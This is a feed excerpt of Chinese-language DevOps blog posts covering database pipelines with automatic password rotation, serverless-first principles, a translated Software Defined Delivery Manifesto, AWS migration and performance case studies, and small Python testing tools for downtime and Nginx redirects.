数据库流水线 # 这是我们做的案例，没有人管理密码的数据库。大家可以看到，这是一个数据库用户常见分析结构，Root是数据库最大的权限。在所有的用户里面没有一个活着的人知道用户密码的，Root有下面所有的权限，包括有用户管理和配置管理的权限，以及下面所有的权限。 Power User是DDL语言，每一个都是针对我们数据库权限的访问，通过这种分层访问的方式来决定数据库里面的用户分配。我们应用访问数据库也会有一个用户，就是App User，目前是没有人知道密码的。我们首先会有权限架构，权限架构会扩大分配应用。
我们的数据库是构建了一个流水线，前年有一个实践叫基础设施流水线，我们建立了一个数据库流水线。从左边到右边看，左边第一个配置是把PaaS平台的网络配置关于数据库的配置好，如果有变动就相当于重新建。 当然我们用了一些高可用的手段，让它的变动不那么大，我们会新建数据库，用PaaS平台数据库配置。数据库配置文件，建好数据库之后需要配置文件，当然数据库配置文件完成之后需要数据库重启。但是有些 PaaS 平台包括公有云不用重启，创建之后这两边就变成一块了，这是我说的数据库的基础设施。 这里左边是数据基础设施，右边是数据库实例，我们把这些全部放到流水线里面。而这两份除了最基本的创建用户、删减用户、增加用户名和密码之后，我们可能还有一些用户数据是由应用程序触发的，我们就会放到另外一条流水线里面。 这边完成之后会驱动这边。所以我们可以做到每天把数据库重新干了再恢复，中间会有一个差额，这个数额我们会通过打标志的方式迁移过来。 另外一种比较快的方式是数据库镜像，现在很多公有云数据库会做数据库镜像，很快就能还原出数据库实例。我知道在AWS上有一个没有服务器实例的数据库，大家有兴趣的可以尝试一下，当然中国区应该没有，是在国外的区域。
没有人管理的密码数据库还有一点，就是我们的应用流水线。我们每次应用部署的时候都会更新访问应用的用户名密码。我们的方式是每次部署的时候创建一个新的用户，我们的用户名就是 app-user-version，每次部署的时候都会有新的用户，他的密码是自动随机生成的。每次生成密码的时候，按需可以随机创建新的基础设施，如果我的配置没有变更，他的变动是很小的，是秒级的，可能我点基础设施没有变动就快速过去了。
另外一点，在这个基础设施上再部署新的应用，你会奇怪自动创建新用户的权限是哪里的。这个自动创建新用户的权限，我们会取得一个临时的权限，在创建完新用户之后取得一个权限，不是Root权限。
创建权限之后再把它的权限回收，我创建完用户之后就把用户权限回收了，也就是说，保证我使用这个权限的时候，当场的情况下只有一次授权，谁都没有碰过任何用户名密码，因为我每次用户名密码都是自动随机生成的，只有应用程序自己知道密码是什么样的，这是我们每次部署都会更换密码的一个方式。 我们在以前创建应用数据中心的时候是从左边开始的，网络到应用程序我们都管，后面我们有云之后，到 IaaS 平台的时候，操作平台可能是 IaaS 平台给定的，上面是我们处理的。到了 PaaS 和 SaaS 之后有更多事情交给云环境，我们所需要写的程序越来越少。我前面说到，后 DevOps 时代你所需要管理的基础设施是越来越少的，但是管理基础设施的复杂度会越来越高。
Serverless First # 什么叫做无服务器优先。就是我们在发布应用程序的时候制定以下原则，作为一个程序员，我希望:
我写的代码直接部署到某个地方就可以运行(FaaS); 若1不可得，那就把我的运行时和代码一起打包直接部署运行。（利用Docker 或者 虚拟机镜像） 若2还是不行，那我希望能够把我需要的运行时在代码部署前自动化配置好。(Infrastructure as code) 若3再不可得，我希望能够有API支持我用代码配置环境。(API) 也就是说，当你开始写代码的时候，首先就要做好如何部署的准备。然后通过部署的方式来定义你的开发模型。在所有的部署方式里，Serverless 无疑是成本最低、稳定性最好的。之后的几条部署方式的稳定性则越来越弱。
这里讲到CLI calls API，你做的事情是通过你的命令和API处理的。在座有没有用过AWS应用的，它会给你一个命令，AWS应用后面跟着服务、服务跟着操作，每个操作都可以通过CLI工具完成，这个东西是非常好编程的。而不是给你一大堆核心界面点来点去，那样的东西是非常不好管理的。
这种面向资源的计算思维，每次CLI API都是异步的，性能上还会好一点。另外一点是在这种情况下你需要有全云端运维机制，知道你所对应的资源是不是完成你所要完成的工作，这就是一种方式。
右边是国外比较通用的，左边是对应的产品。以前我们做应用性能测试的时候要买点做各种各样的事情，自己要开发、自己要找工具、自己要搭建。我们现在首先我们用这些运维工具，我们不再自己搭建了，我们在云端就用云端的服务，非常成熟。
比如说查日志，我们看到很多ELK教程，很多人都把ELK搭建起来，但是现在已经不太用了，有从ELK调整到EFK的吗？我们已经不再用自己搭建的方式，而是买成熟实践和稳定实践的方式做这件事情。全云端运维，右边是国内对应的产品。
全云端在线协作开发，AWS上的Cloud9被AWS收购的，我们的整个开发环境都是在云上的。你只要有一个浏览器，不需要在自己的配置上装安装包、装Java，虽然Java马上要收费了，我们未来可能不会再用Java了，我们会用全云端在线协作开发。
国内也有同样的产品叫行云趣码，这个产品跟前面的Cloud9不一样，行云趣码产品可以接不同的云环境。你只要有任何的云环境，就可以在上面搭建这样的环境。所以你的开发人员入门使用这些东西的时间就会大大缩短，我打开浏览器就开发了，不用考虑语言冲突和各种SDK的麻烦。
另外一个是FaaS应用，函数即服务。最早是 AWS Lambda，我两年前讲 AWS Lambda的时候还是一个很新的概念，这两年各种平台都已经出现了。你只写应用端的一些代码，剩下的都不需要管。</description></item><item><title>【翻译】软件定义交付宣言</title><link>https://wwww.guyu.me/posts/2019-03-14-sdd-manifesto/</link><pubDate>Thu, 14 Mar 2019 00:00:00 +0000</pubDate><guid>https://wwww.guyu.me/posts/2019-03-14-sdd-manifesto/</guid><description>原文链接：https://github.com/sdd-manifesto/manifesto 中文链接：https://github.com/wizardbyron/manifesto
软件定义交付宣言（Software Defined Delivery Manifesto） # 我们认识到, 提供有用的软件塑造了我们的世界。我们认识到，代码是指定精确操作的最佳方式。我们认识到, 只有在交付代码时, 代码才会有用。
交付不是一个细节, 而是我们的工作。现在是将我们的核心技能应用到自己的工作中的时候了。现在是时候 工程化 我们的交付。我们在人类自身和计算机之间分配我们的工作: 人类用于决策, 而自动化用于任务。
交付不是一个细节，而是我们的工作。现在是应用我们的核心技术到我们工作中的时刻了。现在是工程化我们的交付。我们在我们自身和计算机之间区分我们的工作：人类为了决策，自动化为任务。
交付工作本质上是独特的。应用程序、组织、部署环境和团队的每个组合都有自己的上下文。我们认识到, 每个团队都需要理解这种独特性的交付和自动化。我们认识到, 虽然持续交付对于满足业务需求至关重要, 但自动化所有重复的任务非常重要。
我们加快自动化的速度与加快应用程序开发的方式相同: 使用现代体系结构和编程语言以及用于通用能力的框架、库和服务。
我们承认现有技术。这不是发明的工作, 而是表达的工作, 是及时和急需的方法的工作。
交付基础设施现在是可编程的, 所以我们将对其进行编程。
软件定义交付（Software Defined Delivery）是 # 核心： 交付是每个软件团队和组织的基本和战略能力。
一流的： 交付代码就是生产代码。 战略性： 决定团队和组织层面的政策;在代码中精确地实现它, 而无需辛劳。 演进： 随着我们的了解, 我们不断地改进我们的交付。 工程化的: 在可靠的、可测试的代码中。
现代软件架构: 事件驱动并可扩展。 现代编程语言: 逻辑最好在代码中指定, 而不是在图片或 GUI 中指定。脚本不会扩张。 基于模型: 由软件领域的模型支持, 包含对代码的理解。 可测试: 允许部署在生产前进行较短的交付周期以发现错误。 进步: 随时促进部署。提供对受众群体和环境进行有控制、选择性的更改。允许是渐进和深思熟虑的发布。 协作:
在人群中: 每个人都可以通过代码表达他们的专业知识, 以造福于每个人。 在软件中: 我们使用同类最佳的工具, 但我们对这些工具的组合是独一无二的。 在人群和软件中: 协作自动化增强了我们的感知, 并实现了我们的决策。它将信息和行动带到我们所处的位置, 并使自动化行为为我们所理解。通过代码, 我们区分团队的共享交付目标集和它们的实现。 加速:
通过自动化: 我们自动执行重复的任务, 以加快我们的工作, 避免错误。 通过复用: 开发人员、团队和组织之间共享通用功能。 可观察的: 常见的方法是观察和排除作为生产系统的交付过程中发生的情况。
跟踪: 观察系统中的活动并跟踪动作之间的关系。 调试: 与交付流程交互并审查。 指标: 从整个交付流程中的活动中派生指标。 作者：（按照姓名首字母排序）Kenny Bastani, Marc Holmes, Rod Johnson, Jessica Kerr, Mik Kersten, Russ Miles, Erin Schnabel, Matt Stine.</description></item><item><title>从第19期技术雷达看 DevOps 的发展趋势</title><link>https://wwww.guyu.me/posts/2018-12-10-devops-trend-from-tech-radar-vol19/</link><pubDate>Mon, 10 Dec 2018 00:00:00 +0000</pubDate><guid>https://wwww.guyu.me/posts/2018-12-10-devops-trend-from-tech-radar-vol19/</guid><description>2018年下半年的技术雷达发布了。看过的朋友可能和我的感觉一样，会发现大部分条目都是和微服务和 DevOps 相关，但这些条目散落在不同的象限里。本文将这些散落在不同象限的条目采用以下 5 个主题进行重组：
DevOps 合作新实践 云计算新实践 容器新技术 微服务及其误区 安全 特别要提出的是，这期技术雷达采纳了 2018 年的 DevOps 报告 中的四个关键指标(FOUR KEYMETRICS):前置时间，部署频率，平均恢复时间(MTTR)和变更失败百分比。而这四个关键指标也是业界度量 DevOps 效果的统一方式。
每个指标都创造了一个良性循环，并使团队专注于持续改进:缩短交付周期，减少浪费的活动，从而使你可以更频繁地部署，进而改进他们的实践和自动化流程。通过更好的实践，自动化和监控可以提高你从故障中恢复的速度，从而降低故障频率。
DevOps 的合作 # 如何更好的在组织内合作是 DevOps 实践中永恒不变的的话题。随着 DevOps 合作理念的深入，合作的范围越来越越广，随之带来了新的问题和挑战。这期的技术雷达介绍了以下几方面的合作：
和外包团队/供应商的 DevOps 合作 和用户/客户/UX设计师的合作 分布式团队之间的合作 和外包团队的 DevOps 合作 # 而随着 DevOps 应用的加深，会不可避免的碰到组织结构上带来的问题。特别是和外包方的合作，会影响组织的 DevOps 表现。这样的合作往往充满了漫长繁冗且火药味十足的会议和合同谈判，这是 DevOps 运动中不希望看到的但是又无法避免的问题。在 2018 年的 DevOps 报告中看到外包会带来效能下降——“低效能团队将整部分职能进行外包的可能性几乎是高效能团队的 4 倍，这些 外包功能包括测试或运维等等。”
看到这里，千万不要得出“不要用外包的结论”。这里说得是不要“职能的外包”，而“端到端的外包”（End-2-End OutSourcing）则会免除这种顾虑。很多业界一流的 IT 服务企业都提供端到端的 IT 外包服务，你只需要告诉它们你要DevOps，它们会用最有效的方式交付给你。与供应商一起增量交付(INCREMENTAL DELIVERY WITH COTS (commercial off-the-shelf)) 就是这期技术雷达中提出的和外包商一起进行 DevOps 策略之一。与供应商的做端到端的 DevOps 性质的外包另外一个优点则是这样的供应商适合做“长期合作伙伴”来补充你业务、IT 等多样性的不足，甚至能够帮你培训员工。
而随着组织开始采用四个关键指标，这对对供应商的要求也越来越高，但盈利空间相对越来越小。和任何行业一样，成本的降低和效率的提升永远是不变的主节奏。外包也要提升自己的能力水平以跟上技术发展的节奏，这是不可避免的成本。
但是，和外包方的合作仍然是在 DevOps 转型过程中不可避免的痛苦，可以采用一些方式减轻这种痛苦。例如这期技术雷达中介绍的**“风险相称的供应商策略(RISK-COMMENSURATE VENDOR STRATEGY) ”**，它鼓励在高度关键系统中维持其供应商的独立性。而那些相对不太重要的业务可以利用供应商提供的成熟解决方案，这可以让企业更容易承受失去该供应商所带来的影响。这不光是说 IT 产品供应商，同样也指的 IT 服务供应商。
“边界购买（BOUNDED BUY）”就是这样一种实践，在采购产品中即只选择模块化、解耦的，且 只包含于单一业务能力(Business Capability)的限界上下文(Bounded Context)中的厂商产品。应该将这种对 模块化和独立交付能力的要求，加入对供应商选择的验收标准中去。也可以将一小部分业务的端到端维护外包出去，在获得灵活性的同时，又获得高效。
和 UI 的合作 ——DesignOps # DevOps 的目标就是尽可能的缩短最终用户想法到代码之间的距离，避免传递过程中的信息失真。特别是用户的反馈，于是有了 DesignOps 实践。这个领域的实践和工具也日渐成熟。这期的技术雷达介绍的一整套支持 UI 的开发环境(也称为UI DEV ENVIRONMENTS)专注于用户体验设计人员与开发人员之间的协作，例如 :Storybook ，react-styleguidist，Compositor 及 MDX。这些工具大部分围绕 React 的生态圈产生。既可以在组件库或设计系统的开发过程中单独使用，也可以嵌入到 Web应用项目中使用。</description></item><item><title>公有云(AWS)上的生产环境架构优化案例和迁移套路总结</title><link>https://wwww.guyu.me/posts/2018-08-08-architecutre-optimization-case-study/</link><pubDate>Wed, 08 Aug 2018 00:00:00 +0000</pubDate><guid>https://wwww.guyu.me/posts/2018-08-08-architecutre-optimization-case-study/</guid><description>本文是我在 gitchat 上的文章云计算生产环境架构性能调优和迁移套路总结（以 AWS 为例）的后半部分，本文对原文有所修改和总结。交流实录请点击这里。
在AWS 上的生产环境性能分析案例一文中，记录了我对客户应用生产环境的一次性能分析。接下来，我们要根据所发现的性能问题进行架构优化，以提升可用性和性能。同时，这篇文章也总结了应用迁移到云上的套路。
设计云计算平台迁移计划和方案 # 将应用程序迁移到云计算平台上主要的目的是把自行构建的高风险高成本应用以及组件替换为云计算平台上的高可靠性低成本组件/服务。
应用架构的迁移有两种方案：
一种是整体一次性迁移，即重新实现一个架构并完成部署，然后通过金丝雀发布或者蓝绿发布切换。这种方式的好处是简单，直接，有效，一开始就能按照最佳实践构建应用架构。而且对于现有系统来说影响不大。但如果方案没设计好，容易造成高级别的风险，所以应当进行大量的测试以确保可靠性。
另一种是持续部分迁移，每次引入一点风险，保证风险可控，但缺点就是优化步骤较多。虽然持续部分迁移步骤多，但是总体时间并不一定会比整体迁移更高。
**注意：**由于自动化基础设施和架构设计会带来一些副作用，特别是配置间的耦合。因此，对于生产环境的直接优化要慎用自动化。如果一定要用，请务必在测试环境上做好测试。但如果你能做到自动化并且有完好的测试，不如直接做整体一次性迁移方案得了。
一般说来，一个完整的云平台迁移方案会分为以下三大阶段：
第一阶段：构建高可用架构以实施水平扩展，从而保证了应用的稳定运行。
第二阶段：引入 APM 并根据 APM 数据进行定向优化，采用云计算的服务来优化应用的资源使用。
第三阶段：构建应用端的持续部署，构建 DevOps 的工作模式。
这三个阶段是大的顺序，而每个大的阶段里又会相互掺杂一些其它阶段的内容。但无论什么样的迁移方案，一定要通过度量进行风险/收益比排序，最先完成代价最小，收益最大的内容。
第一阶段：构建高可用架构 # 我们之前说过，一个应用架构的第一追求就是业务的连续性和抗风险能力。一个高可用的架构能够在你的应用面对压力的时候从容不迫。因为如果资源满负荷运转，新的请求会因为没有可用资源而导致排队。这是常见的停机或者性能降低的原因。这就是 AFK 扩展矩阵常说的 X 轴扩展：通过复制自己扩展资源从而达到降低排队等待的时间。此外，水平扩展出来的机器同样也是一个预留资源，能够提高应用的可用性。应用架构不仅仅是应用程序的事情，也包含着资源的分配，二者是相辅相成的。
一般会经历如下几步：
第一步，有状态和无状态分离 第二步，牲畜化（Cattlize）应用实例 第三步，自动化水平扩展（AutoScaling） 第一步：有状态和无状态分离 # 先回顾一下当前应用的架构 ： 状态分离的目标是把有状态的组件和无状态的组件分开，以便在做复制的时候降低不一致性。最简单的判定办法是：如果复制当前的虚拟资源，并通过负载均衡随机分配请求访问，哪些部分会造成不一致。
常见的有状态内容比如数据库，上传的文件。所以，我们要把它们独立出来。在“萨瓦迪卡”的例子中，我们首先把数据库独立了出来。如下图所示：
在这个过程中，我们采用 RDS 而不是另外一个 EC2 上构建一套 MySQL 来完成数据库的分离。最主要的原因就是 RDS 提供了更好的可用性和数据库维护支持，例如自动备份，更多的监控指标，更自动的数据库迁移和维护窗口等。我们采用 Aurora 引擎的 MySQL 模式，这可以将数据库做成一个集群并让另外一个只读分片，降低数据库的负担。
在分离数据库的时候，要注意以下几点：
数据库分离的性能基线就是在同样的负载测试下，不能够比没分离之前更差。 数据库的网络建立在一个私有的子网中，除了应用子网内的 IP 不能访问数据库，从而提高安全性。 构建一个私有域名来访问数据库，这样可以固定应用的内部配置，减少对配置的修改。同时也给外部切换数据库主备等留下了更灵活的空间。 注意对原有数据库 MySQL 配置信息的复制，这会导致很大程度上的性能差异。 对于数据较大的数据库启动而言，会有一个几分钟的热身（Warm up）时间，这会导致性能下降。所以，做切换的时候提前启动数据库以做好准备。 不要用默认的 root 账户作为应用的访问账户。 由于 RDS 可以在不影响数据完整性和一致性的情况下降低使用配置，在最开始的时候采用较高的配置。随着优化的不断进行，可以采用维护时间窗口（Maintenance Time Window）在低流量时段对 RDS 实例的配置进行降级，以节约成本。 完成了数据库的隔离，我们就可以依法炮制文件的隔离了。最简单有效的方案是把文件存储在对象存储服务中。AWS S3 就是这样一种服务。避免自己构建共享文件系统或者共享存储设备。
文件相较于数据库来说，占用的内存资源和 CPU 资源较少，大部分的处理为 IO 处理，只要网络和设备的 IOPS 足够。一般不会出现大的问题。
为了降低文件隔离带来的问题，在迁移文件的时候尽量保证文件目录结构不变，只改变文件访问根（root）的位置。对于文件来说，可以通过多种方式：
如果有对应的文件存储位置修改功能，可以通过修改全局文件存储位置实现。 如果有反向代理，可以通过修改反向代理的配置来通过重定向实现。 对时间敏感的文件读写，可以根据日期和时间建立文件夹。 如果有七层的负载均衡或者 CDN 可以通过路径匹配来实现、 在“萨瓦迪卡”的例子里，我们通过 CDN 来实现了文件的隔离。将文件存储在 AWS S3 上，并且用 CloudFront 作为 CDN。用路径匹配的形式让请求通过访问 S3 而不是虚拟机实例来降低虚拟机的 IO 请求，再加上 CDN 的缓存，这就可以大大减少虚拟机实例的负担，也提升了用户的体验。最终的架构如下图所示：</description></item><item><title>公有云(AWS)上的生产环境性能分析案例</title><link>https://wwww.guyu.me/posts/2018-08-07-performance-analysis-case-study/</link><pubDate>Tue, 07 Aug 2018 00:00:00 +0000</pubDate><guid>https://wwww.guyu.me/posts/2018-08-07-performance-analysis-case-study/</guid><description>本文是我在 gitchat 上的文章云计算生产环境架构性能调优和迁移套路总结（以 AWS 为例）的前半部分，本文对原文有所修改和总结。交流实录请点击这里。
案例背景 # 案例是一个泰国网站的生产环境（请脑补一句“萨瓦迪卡”，为了叙述方便，下文中均以&amp;quot;萨瓦迪卡&amp;quot;指代这个网站。）“萨瓦迪卡”是一个 采用 Wordpress + MySQL搭建的应用。这个遗留系统已经工作了五年。客户已经把在其它 VPS 上平移到 AWS 上。平移（lift and shift）是说原样复制，而迁移（migration）还要进行改造。而客户唯一发挥 AWS 优势的一点就是用了一个配置很高的 EC2 虚拟机 —— m4.4xlarge。这样一台配置的虚拟机有 16 个虚拟 CPU，64 GiB 的内存，以及 2000 Mbps 的网络带宽，最高 3000 IOPS 的 200GiB 的块存储设备（也就是硬盘）。
知识点： GiB 是用二进制计算的，GB 是用十进制计算的。1 GiB 是 2的30 次方，而1 GB 是10 的 9 次方，1 GiB 略大于 1GB。 而且，AWS 的 FreeTier 免费计划是按 GB 计算的哦！
除了基本的网络和虚拟机以外，“萨瓦迪卡” 的所有东西都放在一台虚拟机上。没错，是所有东西——Web 服务器，反向代理，数据库，上传的文件——都放在一台虚拟机上。唯一个一个负载均衡用来承载 HTTPS 证书，没有使用集群，没有高可用，没有数据库/应用分离，没有防火墙，没有 WAF，没有 APM，没有 CDN 而且，没有持续交付流水线，所有部署都要 ssh 到机器上进行操作。如图所示：
“萨瓦迪卡”的生产环境可以被认为是一个裸奔的肉鸡。我曾经一度它已经被轮番入侵很久了，只是还没有被发现而已。而且，“萨瓦迪卡”生产环境的唯一一台服务器的内存率使用经常超过 95%，我很担心它的状况，任何一个小的 DoS，都不需要 DDoS，就可以让它整站宕机了。
我于是把我的担忧汇报给了客户，客户也意识到了问题。在我发现问题之前的一个月就启动了“萨瓦迪卡”的翻新（Revamp）项目，让这个应用保持原样（Keep it as is），直到 6 个月后新项目上线，替换掉当前应用。
然而，没想到我一语成谶。一天，“萨瓦迪卡”被删库了！
&amp;ldquo;删库？别慌！&amp;rdquo; # 作为一个运维工程师，最悲催的事情就是“人在家中坐，锅从天上来”。这天是世界杯的某一场小组赛，而我刚吃完晚饭正在洗碗。突然被客户的 P1 告警（P1 - Priority 1，最高级别告警）惊吓到，得知“萨瓦迪卡”被删库了。
判断的依据是：
“萨瓦迪卡”主页打开是 Wordpress 的初始化安装页面。证明应用是正常的，数据不在了。 在服务器上用 MySQL 客户端登录数据库，找不到“萨瓦迪卡”的数据库。 还好客户每天有全量数据备份，于是客户快速从全量备份恢复了数据库，只是缺少了从备份点到故障点的业务数据。全量数据库的备份文件有 10 GiB，这么大的表如果采用 mysqldump 会因为锁表而导致 10 分钟左右的停机时间（别问我怎么知道的）。</description></item><item><title>一怒之下，我又写了一个开源流量测试工具</title><link>https://wwww.guyu.me/posts/2018-07-07-why-do-i-write-wade/</link><pubDate>Sat, 07 Jul 2018 00:00:00 +0000</pubDate><guid>https://wwww.guyu.me/posts/2018-07-07-why-do-i-write-wade/</guid><description>继一怒之下我写出了 Vivian（详见“测试驱动开发 Nginx 配置”）之后。又在等待客户审批流程的时间里自己写了一个流量测试工具。
背景 # 客户的站点是通过 Wordpress 搭建的，这个应用放在一台 EC2 虚拟机上。奇葩的是，这个应用的 MySQL 数据库也在这台虚拟机上，之前做过一次 RDS 迁移，失败了，原因未知。看起来这个应用和数据库就像筷子兄弟一样，不离不弃，而且没有办法通过 AutoScaling Group 进行水平扩展。也就是说，所有的东西都在一台虚拟机上。
我所要做的，就是把这个架构重新变成可自动水平扩展且高可用高性能有缓存低消耗具备监控和更加安全且有版本控制并可以通过持续交付流水线来半自动部署的架构。你可以重新读一下上一句加粗文字的内容。没错，目前他们连版本控制都没有，所有的操作在服务器上通过 mv 之间 scp 进行。
很不巧的时候，这个“筷子兄弟”应用在上周开始，晚上随机的 Down 机，表现为数据库被删。但通过日志可以发现，是由于内存资源不足导致的 MySQL 数据引擎加载不了导致的。
由于需要做“筷子兄弟”拆分手术，目的是要把数据库和应用程序分开，并且需要进行一些服务的重启和拆分。这些操作中会导致停机时间，为了能够度量这个停机时间，便于做出更好的决策，客户希望在测试环境上能够通过模拟生产环境的工作状态来完成这个任务。我设计了方案，包括以下几点：
知道每一个可能引起停机的操作引起停机的时长。 测试 RDS 能带来多少的性能提升。 找出整个架构引起停机的根本问题。 在 500 个并发用户访问的情况下，会出现的性能拐点。 能够度量应用的资源损耗。 客户已经购买了 NewRelic 和 Flood.io （我在 17 期技术雷达里提交的条目，叉会腰。）但是 Flood.io 的账号分配需要一个额外的审批才可以使用，也就是说，我得等到第二天才能使用。
我想，也许 github 上会有这样的工具能够满足我这个简单的需求，搜了一圈，没有合适的。
于是，一怒之下，我用了大概两个小时的时间用 Python 编写了这样一个测试工具。
工具的设计 # There are only two hard things in Computer Science: cache invalidation and naming things.
&amp;ndash; Phil Karlton
命名是一件很困难的事情。于是，为了纪念这个事情，一开始我用提出这个需求的客户的名字（Dave）来命名它，但可能不太好记忆。所以最后还是用 Wade （Web Application Downtime Estimation）作为这个工具的名字。它很简单，可以在https://github.com/wizardbyron/wade找到。
如果我需要知道停机时长，我必须要先能够持续不断的发出 http 请求，并记录下相应 状态不是 200 OK 的返回。我并不希望应用是一个死循环，因此我需要能够加入时间控制。我期望用下面的这样的方式来使用：
wade -t 10 -u https://www.google.com
其中，-t 代表时间，10 代表持续分钟，-u 表示要测试的 url。我期望这个工具能够连续的帮我输出每次请求的时间和 HTTP 状态字。</description></item><item><title>采用 DevOps 故事落地 DevOps</title><link>https://wwww.guyu.me/posts/2018-06-24-devops-story/</link><pubDate>Sun, 24 Jun 2018 00:00:00 +0000</pubDate><guid>https://wwww.guyu.me/posts/2018-06-24-devops-story/</guid><description>在 2009 年第一届 DevOpsDays 上，《敏捷教练》的作者 Rachel Davies 作为第一届 DevOpsDays 上的第一位分享嘉宾。分享了在 BBC 采用用户故事跟踪非功能需求的经验。然而这一实践并不如 DevOps 的其它实践那样广泛。这个实践实际上很简单，就是把非功能需求做为用户故事的 AC 放入故事卡里。
在我过去实践 DevOps 的经历里，发现每次开始的时候都需要团队做同样的一些事情。而这些事情往往是和用户故事独立的，不能作为用户的一部分体现在工作量里。但这些事情又提升了团队之间的 DevOps 能力，于是，我把这一类的工作固化为 DevOps 故事用来落地 DevOps 实践，而且 DevOps 故事同样遵循并体现 CLAMS 原则的。
所谓 CLAMS 原则，指的是：
Culture（文化） Lean（精益） Automated （自动化） Measurement （度量） Sharing （分享/共担责任）
我把一个团队是否遵循 CLAMS 原则当做是否正确实践 DevOps 的标准之一。
DevOps 故事由 DevOps Epic （DevOps 史诗）和 DevOps Story （DevOps 故事）组成。和用户故事对应，DevOps 史诗故事可以依据具体情况的不同拆分成不同的 DevOps 故事。
而无论 DevOps 史诗 还是 DevOps 故事，都包含以下三个因素：
一定包含 Dev 和 Ops 两个方面
一定包含 Dev 和 Ops 核查的内容
一定包含可以度量的内容
编写 DevOps 史诗故事 # DevOps 史诗故事对于大部分组织来说是类似的，因为这些场景是 DevOps 的核心特征。也就是说，当你的团队完成了 DevOps 史诗故事。那么，你的团队就可以被称作是 DevOps 团队。
一个 DevOps 的史诗故事格式如下：</description></item><item><title>测试驱动开发 Nginx 配置</title><link>https://wwww.guyu.me/posts/2018-06-12-tdd-in-nginx/</link><pubDate>Tue, 12 Jun 2018 00:00:00 +0000</pubDate><guid>https://wwww.guyu.me/posts/2018-06-12-tdd-in-nginx/</guid><description>2017年中，我参与了一个亚太地区互联网公司并购的项目，客户收购了亚太地区 7 个国家的同行业互联网企业和产品。我作为其中的 DevOps 咨询师和 DevOps 工程师，和客户一起完成并购后的产品迁移和技术能力提升的设计、实施和培训。
客户希望采用新的统一产品，并根据不同地区的业务特色进行一些定制，与此同时，需要进行数据迁移以保证业务可以继续运行。其中一个很关键的步骤是把原系统的 URL 通过重定向的方式到新的产品中，因为有很多的第三方链接和搜索引擎依然保留了原系统中的链接。
初步统计了一下，将近有3000多个 URL 需要重定向，光是规则和正则表达式就写了 400 多条（没有统一模式的 URL 害死人啊），这就引发了一个问题：我该如何验证这些规则和覆盖这些 URL ？此外，大量的重定向不光对用户来讲不是很好的体验，如果我要优化这些规则，我如何保证我当前的转发规则不被破坏？
解决方案 # 最早，我们写了一个 Shell 脚本，用 curl命令来验证这些 URL，最初只需要验证 200 条就可以满足需求，时间也不到两分钟。后来，我们采用了一个 Excel 文件来跟踪这些 URL，产品经理只需要把新的重定向 URL 补充到上面，我们就依据这些 URL 来开发 nginx 的重定向规则。
这让我想到了 TDD：先写出一个自动化测试用例，然后修复这个自动化测试用例。更好的是，有了自动化的测试做保护，你可以放心和安全的对代码进行重构。
此外，随着更多的 URL 需要重定向，这个数字在不断的增加。原先的 Shell 脚本执行的时间也从最初的 2 分钟增长到了15分钟。
现有的工具满足不了要求，一怒之下，我决定开发一个自己的工具。它必须具备以下特点：
可以通过文件读取规则，进行大批量验证。 多线程并发执行，可以提升效率。 很容易和 CI 集成。 能帮我做一定程度的重定向优化分析。 于是，我在一个周末的时间用 Python 写下了 vivian： 一个多线程的批量自动化重定向验证工具。
它把原先的 15 分钟的验证时间缩短到了 17 秒，效率提升了 5294 % !!
此外，我把测试用例集成到了代码库里。并把 vivian 提交到了 pipy，这样我就可以通过 pip 在初始化 CI 上安装了。也无需增加到代码库里变成一个需要维护的代码脚本。
选择 Python 的原因主要是因为相较于 Ruby, Go, Java, NodeJS 来说。Python 的语言环境比较稳定，几乎每种 Linux 都包含 Python 的运行环境，且容易安装和集成。
安装使用 Vivian # 安装
pip install vivian 使用
vivian -f example.csv test.</description></item><item><title>云原生 DevOps</title><link>https://wwww.guyu.me/posts/2018-06-02-cloudnative-devops/</link><pubDate>Sat, 02 Jun 2018 00:00:00 +0000</pubDate><guid>https://wwww.guyu.me/posts/2018-06-02-cloudnative-devops/</guid><description>回头遥望，DevOps 将迎来自己的十岁生日。对于整个行业，这十年 DevOps给 IT 行业所带来的冲击并没有因为时间的增长而放慢革新的脚步，反而越发的剧烈和深远。
随着大规模的互联网应用不断在云计算平台上遇到挑战，新的应用架构模式呼之欲出，在众多的实践和方法论中，CloudNative 应用则是其中的佼佼者。 CloudNative 应用结合了 DevOps 社区在互联网上的最佳实践。
然而，仅仅有了构建 CloudNative 应用的方法论是不够的。一方面，没有采用 DevOps 从组织和流程的角度优化企业的流程，仍然会出现 “DevOps 之痛”，并阻碍着互联网转型。另一方面，“经典的”企业级 DevOps 同样面临着 CloudNative 带来的新挑战。于是我们可以看到，很多具有 DevOps 基因的互联网企业开始刻意的进行敏捷和 DevOps 转型。而率先完成 敏捷和 DevOps 的企业在进行 云原生 应用改造和技术革新上带来了新的问题。
这就对 DevOps 在云原生的环境下提出了新的课题和实践诉求，我们如何在云原生的环境下实践 DevOps 以达到更有生产力的表现？
本文将从最新一期的技术雷达中，试图勾画出 DevOps 在云原生的环境下的特性、未来的趋势以及相应的实践。
背景：不断蔓延的云环境复杂性 # 本期技术雷达主题之一是：不断蔓延的云环境复杂性。
随着更多的云计算厂商的诞生，差异性质的服务将会越来越少。而在马太效应下，云计算平台之间也将迎来大规模的整合和重组。云计算平台之间竞争不断加剧，使得我们对云计算有了更多的选择，然而带来的是云平台之间在兼容性上的问题。我们虽然可以看到 Docker 这样的封装式解决方案，但对于整体云计算平台的编排和利用。例如网络，安全设施，服务资源间调度，却统一规范和标准。从平台的角度来看，这确实是避免客户流失的有效手段。但留给用户的选择空间不大。
因此，跨云平台的基础设施编排工具不断出现，使得用户可以在不同的云平台之间无缝切换。随之而来的将是一个云计算的标准或者事实标准将呼之欲出，加强这个市场上的马太效应，淘汰掉小的云服务厂商，或者因为技术独特而被大的厂商收购。
如果你害怕自己的数据中心被平台所绑定，则需要花费更多的成本来维护一个云平台之间兼容性的应用系统。
SecDevOps # 本期技术雷达的另一个主题之一是：信任但要验证。
相对于企业级的可控网络和访问结点来说，在云原生的环境下，企业所面临的挑战则更为艰巨。这就好比你之前在自己小区的花丛里种花，你所面对的无非家猫家狗和小孩子的破坏。然后，你现在要在野生山林里种花，就要面对更加未知和复杂的环境。
然而，适应了企业级的应用开发和维护的开发团队并不如天生的互联网企业那般很快就能适应互联网的大丛林。
